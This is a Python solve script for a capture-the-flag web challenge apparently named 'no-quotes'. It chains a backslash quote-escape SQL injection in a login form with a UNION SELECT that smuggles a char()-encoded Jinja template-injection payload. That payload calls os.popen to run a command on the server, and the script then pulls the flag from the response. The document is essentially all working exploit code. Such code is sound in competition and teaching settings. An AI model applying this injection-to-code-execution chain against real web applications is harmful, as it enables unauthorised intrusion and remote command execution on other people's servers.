import requests
import re
BASE_URL = "https://no-quotes-5af41ca8f4ac0188.chals.uoftctf.org"

def encode_str(s):
    return "char(" + ",".join(str(ord(c)) for c in s) + ")"

def solve():
    url = f"{BASE_URL}/login"
    s = requests.Session()
    ssti = "{{lipsum.__globals__.os.popen('/readflag').read()}}"
    username = '\\'
    password = f') UNION SELECT 1, {encode_str(ssti)};-- -'
    r = s.post(url, data={"username": username, "password": password})
    print(re.search(r'uoftctf\{.*?\}', r.text).group(0))
    
if __name__ == "__main__":
    solve()